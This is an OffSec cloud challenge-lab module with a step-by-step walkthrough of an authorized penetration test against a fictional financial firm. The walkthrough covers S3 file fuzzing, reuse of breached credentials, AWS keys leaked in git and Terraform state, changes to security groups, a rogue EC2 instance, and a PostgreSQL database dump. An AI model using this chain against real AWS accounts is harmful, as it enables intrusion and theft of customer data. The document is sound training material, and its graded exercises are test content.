## 30.1. About the Public Cloud Labs

Before we jump in, let's run through a standard disclaimer.

We will use the _OffSec Public Cloud Labs_ for this challenge lab. OffSec's Public Cloud Labs complement the learning experience with hands-on practice. In contrast to the VPN-connected VM labs we use in some of our materials, the Public Cloud Labs do not require a VPN connection as learners interact with them directly through the internet.

The OffSec Public Cloud labs are another expression of the OffSec core belief that hands-on training provides an excellent opportunity to sharpen our skills.

Please note the following:

1. The lab environment should not be used for any activities that are not described or specifically requested in the learning materials you have been provided with. It is not designed to serve as a playground to test additional items that are out of the scope of this Challenge Lab.
    
2. Do not use the lab environment to target any external assets. This is noteworthy because some Modules may describe or demonstrate attacks against vulnerable cloud deployments for illustrative purposes. To be clear, these illustrative demonstrations or discussions do not condone the use of the lab for the targeting of external assets.
    
3. Existing rules and requirements against sharing OffSec training materials still apply. Do not share credentials and other details of the lab. OffSec oversees activity in the Public Cloud Labs, including monitoring resource usage and detecting abnormal events that do not align with the activities outlined in the Learning Modules and Challenge Labs.
    

Activities that are flagged as suspicious will be investigated. If the investigation determines that a student acted outside of the guidelines described above, or otherwise intentionally abused the OffSec Public Cloud Labs, OffSec may choose to rescind that user's access to the OffSec Public Cloud Labs and/or terminate the user's account.

Note that progress between sessions is not saved. Restarting a Public Cloud Lab will reset it to its original state. After an hour has elapsed, the Public Cloud Lab will prompt to determine if the session is still active. If there is no response, the lab session will end. Learners can continue to manually extend a session for up to ten hours.

The learning material is designed to accommodate the limitations of the environment. No learner is expected or required to complete all of the activities in a Challenge Lab within a single lab session. Even so, learners may choose to break up their learning into multiple sessions with the labs. We recommend learners document performed actions so they can restore the state of the lab environment should the session reset. This is especially important when working through complex labs that require multiple actions.

## 30.1.1. Using Cloud Graders for Challenges

Some of the exercises in this lab involve creating or configuring resources in the provided AWS account. OffSec's cloud grader is a way to measure the state of resources and configurations for such challenges.

An exercise that uses the cloud grader feature will normally have a set of tasks to run in the AWS account. After completing the required objectives, we need to click the "grade button" to validate the lab state. If the tasks were completed according to the requirements in the exercise, the answer will be marked as completed. We can then continue to the next exercise.

It's mandatory to complete the exercises in sequential order, starting from 1. Otherwise, the grader may fail to identify the correct challenge state.

It's important to create only the exact number of resources specified in the exercise prompt. If other resources were created during the challenge, they should be deleted to avoid getting failures while running the grader.

If we restart the challenge lab at any point, we need to start over from exercise 1, even if previous exercises are marked as completed. It's recommended to take notes of the commands in a text file or bash script as we are advancing through the exercises. This will allow us to quickly reproduce the tasks again and continue where we left off.

## 30.2. Getting Started

We have been tasked to conduct a penetration test on the web application, microservices, and cloud infrastructure of _Rainy Day Financial_. The company has been getting serious complaints about their clients being targeted by phishing attempts using realistic information that only the company possesses.

Our objective is to identify any vulnerabilities in the web application or microservices that will allow us to leak sensitive client information by accessing a database hosted on RDS.

## 30.2.1. Accessing the Lab

We can start the challenge lab environment below. This will provide us with the URL for a web application running in AWS and the credentials to a Kali Linux attack box.

The attack box contains a credentials leak located at **/home/kali/FinanceForumBreach2025.txt**. This file will be useful at some point in the assessment.

To create a realistic lab design, multiple services need to be started at once. Because of this, the lab may take about 5 to 8 minutes to fully start.

Info

No extra VPN pack is needed to reach the AWS lab environment. Additionally, the lab environment cannot be accessed with Kali in Browser or Windows in Browser machines.

The lab's URL will vary with each restart. The URLs in your lab environment will not match those in the content below. Use the graders below to verify your progress in this challenge lab.

#### Labs

1. Conduct enumeration to expand Rainy Day Financial's public facing attack surface. Click the grade button after you have logged in to a new system.

Answer

Verify

2. Gain initial access to the AWS environment by obtaining valid credentials to interact with the AWS API. Click the grade button to check your work.

```
Important: The grader system will check that the GetCallerIdentity API call runs successfully using valid credentials. It may take up to one minute for the grader to evaluate the API call after it's executed, so wait a few minutes before clicking the grade button.
```

Answer

Verify

3. Discover access and connect to the system where the Rainy Day Financial's client data is stored. Click the grade button after you connect to the system using valid credentials.

Answer

Verify

4. Retrieve proof of access to the Rainy Day Financial's sensitive client data. The proof will be in the format "OS{[hash]}".

Answer

Verify

## 30.3. Walkthrough

This Learning Unit contains a walkthrough for enumerating and exploiting the challenge lab. If you want to attempt this challenge lab without any further guidance, you can stop reading here.

If you need some assistance, you can continue reading. Each section in this Learning Unit corresponds with the steps needed to complete the exercises for this Challenge Lab. You will still need to use the graders in the previous section to track your progress and complete the challenge lab.

## 30.3.1. Enumeration

Upon starting the lab, we'll obtain a URL: **http://2ojm-rainydays.s3-website-us-east-1.amazonaws.com**. Based on the URL, we know we're dealing with a [static site hosted on S3](https://docs.aws.amazon.com/AmazonS3/latest/userguide/WebsiteHosting.html) in AWS, US-East-1 region.

![Figure 1: Rainy Day Financial Homepage](https://static.offsec.com/offsec-courses/PEN-200/images/offensive_cloud_02/d0984d55e8250f4fd949e8615bb45a99-homepage_screenshot.png)

Figure 1: Rainy Day Financial Homepage

We'll start Burp Suite so we can enumerate the web application. If we're using an external browser, we'll need to [_configure it to proxy through Burp Suite_](https://portswigger.net/burp/documentation/desktop/external-browser-config) and [_import Burp's CA certificate_](https://portswigger.net/burp/documentation/desktop/external-browser-config/certificate).

We can browse around the site and note a few details.

![Figure 2: Burp Suite Findings](https://static.offsec.com/offsec-courses/PEN-200/images/offensive_cloud_02/f6386524c8871404c2343420ad1db122-site_configuration.png)

Figure 2: Burp Suite Findings

We can note on Burp Suite that the site uses some configuration values that are defined in the JavaScript file **/config/site-config.js**.

```javascript
// Contents of /config/site-config.js
window.siteConfig = {
  "endpoints": {
    "contactForm": "https://tr0mc0ygj4.execute-api.us-east-1.amazonaws.com/v1/submit",
    "newsletter": "https://tr0mc0ygj4.execute-api.us-east-1.amazonaws.com/v1/newsletter/subscribe"
  },
  "resources": {
    "investmentGuide": {"id":1, "path":"https://b8671qdz-rainydays-assets.s3.amazonaws.com/resources/c4ca4238a0b923820dcc509a6f75849b.pdf"},
    "marketOutlook": {"id":2, "path":"https://b8671qdz-rainydays-assets.s3.amazonaws.com/resources/c81e728d9d4c2f636f067f89cc14862c.pdf"},
    "retirementCalculator": {"id":7, "path":"https://b8671qdz-rainydays-assets.s3.amazonaws.com/resources/8f14e45fceea167a5a36dedd4bea2543.pdf"},
    "taxStrategies": {"id":12, "path":"https://b8671qdz-rainydays-assets.s3.amazonaws.com/resources/c20ad4d76fe97759aa27a0c99bff6710.pdf"}
  },
  "blogAttachments": {
    "investment-strategies": ["investmentGuide", "marketOutlook"],
    "retirement-planning": ["retirementCalculator", "taxStrategies"],
    "tax-planning": ["taxStrategies"]
  },
  "settings": {
    "formSubmitTimeout": 30000,
    "maxAttachmentSize": 10485760
  }
}
```

> Listing 1 - Contents of /config/site-config.js

After reading the _window.siteConfig_ property, we can see that there are resources with an ID and that they reference PDF files hosted on an S3 bucket.

Another important detail to consider is that there are a few IDs on the sequence missing. This might indicate that there are more files than what the configuration indicates.

If we inspect closely, we can note that the PDF file names are all the same length of hexadecimal characters, indicating a hashing algorithm might have been used to generate the file name. We can attempt to recreate a file name by hashing the corresponding ID and concatenating the result with the _.pdf_ extension.

```kali-shell
kali@cloud-kali:~$  echo "$(echo -n "1" | md5sum | cut -d' ' -f1).pdf"
c4ca4238a0b923820dcc509a6f75849b.pdf
```

> Listing 2 - Understanding the Bucket Naming Format

Looking at the configuration, we can see that IDs from 3 to 6 and from 8 to 11 are missing. We'll enumerate all possible URLs using IDs from 1 to 20.

```kali-shell
kali@cloud-kali:~$ ffuf -w <(for i in {1..20}; do echo -n "$i" | md5sum | cut -d' ' -f1; done) -u "https://b8671qdz-rainydays-assets.s3.amazonaws.com/resources/FUZZ.pdf" -mc all -fc 404,403

...
________________________________________________

 :: Method           : GET
 :: URL              : https://b8671qdz-rainydays-assets.s3.amazonaws.com/resources/FUZZ.pdf
 :: Wordlist         : FUZZ: /proc/self/fd/11
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
 :: Filter           : Response status: 404,403
________________________________________________

c4ca4238a0b923820dcc509a6f75849b [Status: 200, Size: 193077, Words: 2111, Lines: 1148, Duration: 24ms]
c20ad4d76fe97759aa27a0c99bff6710 [Status: 200, Size: 281379, Words: 2479, Lines: 1464, Duration: 36ms]
8f14e45fceea167a5a36dedd4bea2543 [Status: 200, Size: 181182, Words: 2085, Lines: 1144, Duration: 37ms]
c81e728d9d4c2f636f067f89cc14862c [Status: 200, Size: 185022, Words: 2717, Lines: 1217, Duration: 59ms]
d3d9446802a44259755d38e6d163e820 [Status: 200, Size: 724711, Words: 2480, Lines: 2824, Duration: 86ms]
:: Progress: [20/20] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::
```

> Listing 3 - Enumerating S3 Bucket Searching for Files

Excellent! We found a file that was not part of the configuration file. The ID of the file is 10. Its URL is **https://b8671qdz-rainydays-assets.s3.amazonaws.com/resources/d3d9446802a44259755d38e6d163e820.pdf**.

![Figure 3: Hidden PDF Contents](https://static.offsec.com/offsec-courses/PEN-200/images/offensive_cloud_02/dfc0f21214008c2a72df31a271982870-enumerated_gitea_url.png)

Figure 3: Hidden PDF Contents

The PDF we found contains instructions related to Rainy Day Financial's Hackathon.

Among the instructions, we find the URL of a Gitea server **http://ec2-44-201-168-56.compute-1.amazonaws.com/**.

## 30.3.2. Initial Access

Gitea servers usually provide a list of public repositories when we browse **explore/repos**. Unfortunately, in this case we're redirected to the login page.

We know that this Gitea server is used for the Hackathon. This event is also mentioned on the main site's the blog post at **/posts/hackathon/**.

The author of the post is the company's CTO called **Juan Johnson**. Additionally, from the **About Us** page, we know that Juan Johnson's X's handle is _juanjtech_ and that his email address is _j.johnson@rainydayfinancial.internal_.

Since we need authenticated access to the Gitea server, we'll search for Juan Johnson's credentials in the file **/home/kali/FinanceForumBreach2025.txt**, which contains previously obtained breach data. Let's grep for the name "juan" and inspect the results.

```kali-shell
kali@cloud-kali:~$ grep -i "juan" FinanceForumBreach2025.txt
juan35@watts.net:iwuwildcat
jeff73@garcia-jennings.net:juan1591<
bromero@parker-bean.com:juanf
robertsonjuan@lopez.org:bubbababy2
donjuanjohnson@sims-kirby.org:3106338
nguyencorey@gutierrez.com:juanmemo
carrillojuan@yahoo.com:Wisin07
juanjohnson@yahoo.com:thejuanandonly
chelseagordon@greene.biz:juanjoche
```

> Listing 4 - Searching for Juan Johnson's Credentials

There are a couple of promising results. Particularly "donjuanjohnson@sims-kirby.org", and "juanjohnson@yahoo.com".

After using the passwords of both promising accounts paired with Juan's corporate email account, we succeed logging into Gitea with the credentials _j.johnson@rainydayfinancial.internal:thejuanandonly_.

This completes Exercise 1. Use the _Grade_ button in the **Accessing the Lab** section to verify your progress.

## 30.3.3. Finding Leaked Secrets

Upon successfully logging in, we'll find a few repositories at **/explore/repos**.

![Figure 4: Gitea Repo List](https://static.offsec.com/offsec-courses/PEN-200/images/offensive_cloud_02/4581df047a594c0279ab7ca6b0516cf3-gitea_repo_list.png)

Figure 4: Gitea Repo List

However, we'll focus on Juan's project. He has a project called _hackathon-finance_facts_. Let's clone it and try to find secrets by using the _git secrets_ command.

Tip

If we need to install Git Secrets, we can do it by running **sudo apt install git-secrets**. Also, make sure to adapt your commands so that they contain the URL you enumerated, as the paths and IDs will be different each time.

```kali-shell
kali@cloud-kali:~$ git clone http://j.johnson%40rainydayfinancial.internal:thejuanandonly@ec2-44-201-168-56.compute-1.amazonaws.com/juanjtech/hackathon-finance_facts.git
Cloning into 'hackathon-finance_facts'...
remote: Enumerating objects: 18, done.
remote: Counting objects: 100% (18/18), done.
remote: Compressing objects: 100% (16/16), done.
remote: Total 18 (delta 3), reused 0 (delta 0), pack-reused 0
Receiving objects: 100% (18/18), done.
Resolving deltas: 100% (3/3), done.

kali@cloud-kali:~$ cd hackathon-finance_facts

kali@cloud-kali:~$ git secrets --register-aws
OK
kali@cloud-kali:~$ git secrets --scan-history
157798ed40dcafd7d5e02b101317918e6f265e5b:app/app.py:11:    aws_access_key_id='AKIAXIGFJO2YWJUQJYAJ',
157798ed40dcafd7d5e02b101317918e6f265e5b:app/app.py:12:    aws_secret_access_key='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',
...
```

> Listing 5 - Obtaining Leaked Secrets

Upon executing git secrets, we notice that there's a particular commit that contains hard-coded credentials on **app.py**.

Let's try to use the credentials to check if they work.

Tip

Don't just copy and paste the commands. You need to modify the values of the keys accordingly.

```kali-shell
kali@cloud-kali:~$ export AWS_ACCESS_KEY_ID=AKIAXIGFJO2YWJUQJYAJ
kali@cloud-kali:~$ export AWS_SECRET_ACCESS_KEY=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
kali@cloud-kali:~$ aws sts get-caller-identity
{
    "UserId": "AIDAXIGFJO2YU4QQDU7RA",
    "Account": "498629965489",
    "Arn": "arn:aws:iam::498629965489:user/hackaton-jj"
}
```

> Listing 6 - Testing Leaked Credentials

Excellent! Our credentials worked and we can now interact with AWS services from our command line.

This completes Exercise 2. Use the _Grade_ button in the **Accessing the Lab** section to verify your progress.

## 30.3.4. Internal Enumeration on the AWS Account

Now that we have credentials, we can use them to understand what we have access to.

Let's set our default region to match the region in the application's URL and then try to list available S3 buckets.

```kali-shell
kali@cloud-kali:~$ export AWS_DEFAULT_REGION=us-east-1
kali@cloud-kali:~$ aws s3 ls
2025-05-29 19:11:48 qh2d-rainydays
2025-05-29 19:11:48 rzw3hng3-rainydays-assets
2025-05-29 19:11:49 rzw3hng3-rainydays-cloudtrail-logs
2025-05-29 19:11:48 rzw3hng3-rainydays-dev-tfstate
```

> Listing 7 - Listing S3 Buckets

Upon inspecting the contents, we can notice that there's a bucket that contains the _tfstate_ suffix. That suffix is commonly used to refer to [_Terraform_](https://developer.hashicorp.com/terraform) States, which contain infrastructure metadata after an [_Infrastructure as Code_](https://aws.amazon.com/what-is/iac/) (IaC) deployment.

Terraform states can contain secrets, so let's inspect what we can find and download relevant files.

```kali-shell
kali@cloud-kali:~$ aws s3 ls rzw3hng3-rainydays-dev-tfstate
                           PRE state/

kali@cloud-kali:~$ aws s3 ls rzw3hng3-rainydays-dev-tfstate/state/
2025-05-29 19:19:23      86750 provisioner-lambdas.tfstate
2025-05-29 19:11:52       8019 provisioner.tfstate

kali@cloud-kali:~$ aws s3 cp s3://rzw3hng3-rainydays-dev-tfstate/state/provisioner-lambdas.tfstate ./
download: s3://rzw3hng3-rainydays-dev-tfstate/state/provisioner-lambdas.tfstate to ./provisioner-lambdas.tfstate

kali@cloud-kali:~$ aws s3 cp s3://rzw3hng3-rainydays-dev-tfstate/state/provisioner.tfstate ./
download: s3://rzw3hng3-rainydays-dev-tfstate/state/provisioner.tfstate to ./provisioner.tfstate
```

> Listing 8 - Listing Terraform State Files

Perfect! Now we need to inspect if the files we obtained contain anything we can use. Let's start with **provisioner.tfstate**.

```kali-shell
kali@cloud-kali:~$ cat provisioner.tfstate
{
  "version": 4,
  "terraform_version": "1.10.5",
  "serial": 1,
  "lineage": "10ab765a-3d26-11bb-7a7c-8e56bd314bfa",
  "outputs": {
    "sysadmin_access_key_id": {
      "value": "AKIAX6QLUZB2Q7MM3WG4",
      "type": "string"
    },
    "sysadmin_secret_access_key": {
      "value": "u48m13KYMH+ReeqsT3jMsZ/4/zd2fsOxjAw+S+Ag
      "type": "string",
      "sensitive": true
    }
  },
  "resources": [
...
```

> Listing 9 - Finding SysAdmin Keys

The first few lines of the file contain outputs that relate to Access Key ID and Secret Access Key for IAM access. Those keys seem to belong to a user called sysadmin.

Let's make a note of this and check the **provisioner-lambdas.tfstate** file.

Although the file has many interesting values, such as public keys and some Base64-encoded values. We can also note that it also has the configuration used to connect to a PostgreSQL database.

```kali-shell
kali@cloud-kali:~$ cat provisioner-lambdas.tfstate
...
"mode": "managed",
"type": "aws_db_instance",
"name": "postgres",
"provider": "provider[\"registry.terraform.io/hashicorp/aws\"]",
"instances": [
    {
        "schema_version": 2,
        "attributes": {
            "address": "rainy-days-pg.cxpggdwujnh0.us-east-1.rds.amazonaws.com",
            ...
            "endpoint": "rainy-days-pg.cxpggdwujnh0.us-east-1.rds.amazonaws.com:5432",
            "engine": "postgres",
            ...
            "password": "XePDNKDpvFsB0-oZN2Vk",
            ...
            "username": "sysoper",
            "vpc_security_group_ids": [
                "sg-057d97a3f2d29f4f2"
            ] 
    },
...
```

> Listing 10 - Finding Database Credentials

Excellent! We have the endpoint of a database, the credentials, and we even got the ID of the security group that seems to be used to restrict connections to it.

If we keep checking, we'll also find the definition of the security group:

```
{
      "mode": "managed",
      "type": "aws_security_group",
      "name": "rds_postgres_sg",
      "provider": "provider[\"registry.terraform.io/hashicorp/aws\"]",
      "instances": [
        {
          "schema_version": 1,
          "attributes": {
            "arn": "arn:aws:ec2:us-east-1:546559019125:security-group/sg-057d97a3f2d29f4f2",
            "description": "Allow access to RDS PostgreSQL",
            "egress": [
              {
                "cidr_blocks": [
                  "0.0.0.0/0"
                ],
                "description": "",
                "from_port": 0,
                "ipv6_cidr_blocks": [],
                "prefix_list_ids": [],
                "protocol": "-1",
                "security_groups": [],
                "self": false,
                "to_port": 0
              }
            ],
            "id": "sg-057d97a3f2d29f4f2",
            "ingress": [
              {
                "cidr_blocks": [],
                "description": "",
                "from_port": 5432,
                "ipv6_cidr_blocks": [],
                "prefix_list_ids": [],
                "protocol": "tcp",
                "security_groups": [
                  "sg-0e7c2fc85a55fb236"
                ],
                "self": false,
                "to_port": 5432
              },
              {
                "cidr_blocks": [],
                "description": "",
                "from_port": 5432,
                "ipv6_cidr_blocks": [],
                "prefix_list_ids": [],
                "protocol": "tcp",
                "security_groups": [],
                "self": true,
                "to_port": 5432
              }
            ],
            "name": "rds-postgres-sg",
            "name_prefix": "",
            "owner_id": "546559019125",
            "revoke_rules_on_delete": false,
            "tags": null,
            "tags_all": {},
            "timeouts": null,
            "vpc_id": "vpc-0324886f3f1a9ea6d"
          },
...
    },
```

> Listing 11 - Security Group Definition in the Terraform State

We can note that the security group we previously identified (`sg-057d97a3f2d29f4f2`) grants access to the database to any resource that is linked to another security group (`sg-0e7c2fc85a55fb236`). Let's make a note of that for later.

## 30.3.5. Lateral Movement

Although we have credentials to a database and our goal is to exfiltrate it, our main hurdle at this point is that the database's endpoint is probably a local IP, as RDS databases are rarely exposed to the internet. We can verify this by using the _host_ command.

```kali-shell
kali@cloud-kali:~$ host rainy-days-pg.cxpggdwujnh0.us-east-1.rds.amazonaws.com
rainy-days-pg.cxpggdwujnh0.us-east-1.rds.amazonaws.com has address 172.31.92.59
```

> Listing 12 - Checking DB Host

As we suspected, the hostname resolves to a local IP. There are many options we can explore, such as leveraging the _sysadmin_ credentials to create an EC2 instance and attempting to connect to the database from there.

There are a few things we need to consider while creating this instance:

- We need to create an additional security group and open port 22 access to the instance we'll create.
- Inject our public key at deployment to be able to connect.
- We need to make sure we grant our new VM access to the PostgreSQL server.

Let's try to switch to the sysadmin user using the credentials we found. We'll then try to list available security groups to verify if the information we obtained from the Terraform state is correct.

```kali-shell
kali@cloud-kali:~$ export AWS_ACCESS_KEY_ID=AKIAX6QLUZB2Q7MM3WG4
kali@cloud-kali:~$ export AWS_SECRET_ACCESS_KEY=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
kali@cloud-kali:~$ aws ec2 describe-security-groups --query 'SecurityGroups[*].[GroupName,GroupId]' --output text
...
rds-postgres-sg sg-057d97a3f2d29f4f2
...
```

> Listing 13 - Listing Security Groups

Now that we're sure we have the security group name, let's create an additional security group that opens port 22 to the world. We'll also modify _rds-postgres-sg_ so that it allows connections originating from resources that use our new security group, i.e. the EC2 instance we'll eventually create.

```kali-shell
# Creating a new security group
kali@cloud-kali:~$ aws ec2 create-security-group --group-name ec2-access-sg --description "Temporary access"
{
    "GroupId": "sg-039b98ef24b38239b",
    "SecurityGroupArn": "arn:aws:ec2:us-east-1:546559019125:security-group/sg-039b98ef24b38239b"
}
# Authorizing SSH access from any IP
kali@cloud-kali:~$ aws ec2 authorize-security-group-ingress --group-name ec2-access-sg --protocol tcp --port 22 --cidr 0.0.0.0/0
{
    "Return": true,
    "SecurityGroupRules": [
        {
            "SecurityGroupRuleId": "sgr-03652041b04b5e5e1",
            "GroupId": "sg-039b98ef24b38239b",
            "GroupOwnerId": "546559019125",
            "IsEgress": false,
            "IpProtocol": "tcp",
            "FromPort": 22,
            "ToPort": 22,
            "CidrIpv4": "0.0.0.0/0",
            "SecurityGroupRuleArn": "arn:aws:ec2:us-east-1:546559019125:security-group-rule/sgr-03652041b04b5e5e1"
        }
    ]
}
# Allow the new security group access PostgreSQL
kali@cloud-kali:~$ aws ec2 authorize-security-group-ingress --group-name rds-postgres-sg --protocol tcp --port 5432 --source-group ec2-access-sg
{
    "Return": true,
    "SecurityGroupRules": [
        {
            "SecurityGroupRuleId": "sgr-00a868becd90cf2da",
            "GroupId": "sg-057d97a3f2d29f4f2",
            "GroupOwnerId": "546559019125",
            "IsEgress": false,
            "IpProtocol": "tcp",
            "FromPort": 5432,
            "ToPort": 5432,
            "ReferencedGroupInfo": {
                "GroupId": "sg-039b98ef24b38239b",
                "UserId": "546559019125"
            },
            "SecurityGroupRuleArn": "arn:aws:ec2:us-east-1:546559019125:security-group-rule/sgr-00a868becd90cf2da"
        }
    ]
}
```

> Listing 14 - Creating a Security Group

Now that we have a security group, we can create an EC2 instance.

Tip

Remember to use your own SSH public key for the next step. To generate one, we can use: `ssh-keygen -t ed25519`. After tapping enter a few times, the public key will be generated at **/home/kali/.ssh/id_ed25519.pub**.

```kali-shell
# Obtaining an image ID of an Amazon Linux AMI
kali@cloud-kali:~$ aws ec2 describe-images --owners amazon --filters "Name=name,Values=al2023-ami-*-x86_64" "Name=root-device-type,Values=ebs" "Name=virtualization-type,Values=hvm" "Name=state,Values=available" --query 'Images | sort_by(@, &CreationDate) | [-1].ImageId' --output text
ami-03f163cd0bb298dcd

# Create userdata script file to inject our public key
kali@cloud-kali:~$ cat > userdata.sh << 'EOF'
#!/bin/bash
mkdir -p /home/ec2-user/.ssh
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIvZMGXcnVsvA4B8nW+iVayWFYqz7+UkydotOj/WmNFL" >> /home/ec2-user/.ssh/authorized_keys
chmod 700 /home/ec2-user/.ssh
chmod 600 /home/ec2-user/.ssh/authorized_keys
chown -R ec2-user:ec2-user /home/ec2-user/.ssh
EOF

# Launch EC2 instance using the ami found above and the security group we created
kali@cloud-kali:~$ aws ec2 run-instances --image-id ami-03f163cd0bb298dcd --count 1 --instance-type t2.micro --security-group-ids sg-070b98ccfd8db4e16 --user-data file://userdata.sh --tag-specifications 'ResourceType=instance,Tags=[{Key=Name,Value=postgres-dump-instance}]' | /bin/cat
{
...
            "InstanceId": "i-055220c036b848301",
            "ImageId": "ami-03f163cd0bb298dcd",
            "State": {
                "Code": 0,
                "Name": "pending"
            },
...
}
...
# Wait until the instance is ready, we need to use the InstanceId obtained above
kali@cloud-kali:~$ aws ec2 wait instance-running --instance-ids i-055220c036b848301

```

> Listing 15 - Creating EC2 Instance

At this point, we have our EC2 instance. We need to connect to it and install PostgreSQL client tools and check if we can connect.

## 30.3.6. Data Exfiltration

Our EC2 instance is ready, let's obtain its public IP to connect and start setting it up.

```kali-shell
kali@cloud-kali:~$ aws ec2 describe-instances --instance-ids i-055220c036b848301 --query 'Reservations[0].Instances[0].PublicIpAddress' --output text
44.204.191.196

```

> Listing 16 - Getting the Instance's Public IP

Let's connect via SSH and install PostgreSQL client tools. We don't need credentials as we injected our public key.

```bash
kali@cloud-kali:~$ ssh ec2-user@44.204.191.196
...
[ec2-user@ip-172-31-89-140 ~]$ sudo yum install -y postgresql17
Amazon Linux 2023 Kernel Livepatch 
...
Installed:
  postgresql17-17.4-1.amzn2023.0.1.x86_64                                                     postgresql17-private-libs-17.4-1.amzn2023.0.1.x86_64

Complete!
```

> Listing 17 - Installing PostgreSQL Client

Next, let's try to connect with the credentials we previously obtained and list the available databases.

```bash
[ec2-user@ip-172-31-89-140 ~]$ PGPASSWORD=XePDNKDpvFsB0-oZN2Vk psql -h rainy-days-pg.cxpggdwujnh0.us-east-1.rds.amazonaws.com -U sysoper -d postgres
psql (17.4, server 16.3)
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, compression: off, ALPN: none)
Type "help" for help.

postgres=> \l
                                                           List of databases
         Name          |  Owner   | Encoding | Locale Provider |   Collate   |    Ctype    | Locale | ICU Rules |   Access privileges
-----------------------+----------+----------+-----------------+-------------+-------------+--------+-----------+-----------------------
 postgres              | master   | UTF8     | libc            | en_US.UTF-8 | en_US.UTF-8 |        |           |
 rainyday_contact_form | master   | UTF8     | libc            | en_US.UTF-8 | en_US.UTF-8 |        |           | =Tc/master           +
...
(5 rows)

postgres=>\q
```

> Listing 18 - Enumerating and Listing Available Databases

Excellent! We've connected to the database.

This completes Exercise 3. Use the _Grade_ button in the **Accessing the Lab** section to verify your progress.

Let's use _pg_dump_ to write the `rainyday_contact_form` database to a file so that we can exfiltrate the data.

```bash
[ec2-user@ip-172-31-89-140 ~]$ PGPASSWORD=XePDNKDpvFsB0-oZN2Vk pg_dump -h rainy-days-pg.cxpggdwujnh0.us-east-1.rds.amazonaws.com -U sysoper -d rainyday_contact_form > dump.sql
[ec2-user@ip-172-31-89-140 ~]$ ll
total 20
-rw-r--r--. 1 ec2-user ec2-user 18256 May 30 15:20 dump.sql
```

> Listing 19 - Dumping Rainy Day Financial

Now that we have the _dump.sql_ file, we have access to customer data.

```bash
[ec2-user@ip-172-31-89-140 ~]$ cat dump.sql
--
-- PostgreSQL database dump
--

-- Dumped from database version 16.3
-- Dumped by pg_dump version 17.4

SET statement_timeout = 0;
SET lock_timeout = 0;
SET idle_in_transaction_session_timeout = 0;
SET transaction_timeout = 0;
SET client_encoding = 'UTF8';
SET standard_conforming_strings = on;
SELECT pg_catalog.set_config('search_path', '', false);
SET check_function_bodies = false;
SET xmloption = content;
SET client_min_messages = warning;
SET row_security = off;
...
```

> Listing 20 - Analyzing the Dump File

After reading the file, we conclude our attack. We've replicated how an attacker could have compromised the company's cloud environment and gained access to data that could be used to target the company's customers.

If you analyze the SQL file, you'll find a flag that you can submit for Exercise 4 in the **Accessing the Lab** section to verify your progress.
